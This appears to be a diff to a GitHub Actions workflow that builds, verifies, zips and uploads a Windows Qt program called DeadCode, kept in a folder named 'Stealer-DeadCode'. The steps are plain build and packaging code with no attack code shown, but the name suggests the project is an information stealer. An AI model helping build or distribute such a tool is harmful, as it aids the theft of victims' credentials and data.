-          foreach ($dll in $dlls) {
-            if ($dll -eq "gdiplus.dll") {
-              $sourceDir = $system32Dir
-            } else {
-              $sourceDir = $vcpkgBinDir
-            }
-            if (Test-Path "$sourceDir/$dll") {
-              Copy-Item -Path "$sourceDir/$dll" -Destination .
-              Write-Host "Copied $dll"
-            } else {
-              Write-Host "Warning: $dll not found in $sourceDir"
-            }
-          }
-          Write-Host "Dependencies copied"
-        shell: powershell
+    - name: Upload artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: DeadCode-Portable
+        path: $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/DeadCode-Portable.zip
+        if-no-files-found: error
 
-      - name: Copy additional files
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
-          Copy-Item -Path "config.json" -Destination "build/release/" -Force
-          Copy-Item -Path "icon.ico" -Destination "build/release/" -Force
-          New-Item -Path "build/release/data" -ItemType Directory -Force
-          Write-Host "Additional files copied"
-        shell: powershell
-
-      - name: Verify all files
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/release
-          $requiredFiles = @(
-            "DeadCode.exe",
-            "Qt6Core.dll",
-            "Qt6Gui.dll",
-            "Qt6Widgets.dll",
-            "Qt6Network.dll",
-            "Qt6Sql.dll",
-            "sqlite3.dll",
-            "libcurl-4.dll",
-            "libssl-3-x64.dll",
-            "libcrypto-3-x64.dll",
-            "libzip.dll",
-            "zlib1.dll",
-            "libbz2.dll",
-            "libssh2-1.dll",
-            "nghttp2.dll",
-            "libzstd.dll",
-            "libbrotlicommon.dll",
-            "libbrotlidec.dll",
-            "libbrotlienc.dll",
-            "gdiplus.dll",
-            "plugins/platforms/qwindows.dll",
-            "plugins/sqldrivers/qsqlite.dll",
-            "config.json",
-            "icon.ico",
-            "data"
-          )
-          $missingFiles = $requiredFiles | Where-Object { -not (Test-Path $_) }
-          if ($missingFiles) {
-            Write-Host "Error: Missing files: $missingFiles"
-            exit 1
-          }
-          Write-Host "All required files present"
-        shell: powershell
-
-      - name: Create artifact
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build
-          & "C:/Program Files/7-Zip/7z.exe" a DeadCode-Portable.zip ./release/*
-          if ($LASTEXITCODE -ne 0) {
-            Write-Host "Error: Failed to create zip archive"
-            exit 1
-          }
-        shell: powershell
-
-      - name: Upload artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: DeadCode-Portable
-          path: $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/DeadCode-Portable.zip
-          if-no-files-found: error
-
-      - name: Cleanup
-        if: always()
-        run: |
-          Remove-Item -Path "$env:GITHUB_WORKSPACE/Stealer-DeadCode/build" -Recurse -Force -ErrorAction SilentlyContinue
-          Remove-Item -Path "C:/Temp/DeadCode_*" -Recurse -Force -ErrorAction SilentlyContinue
-        shell: powershell
+    - name: Cleanup
+      if: always()
+      run: |
+        Remove-Item -Path "$env:GITHUB_WORKSPACE/Stealer-DeadCode/build" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "C:/Temp/DeadCode_*" -Recurse -Force -ErrorAction SilentlyContinue
+      shell: powershell
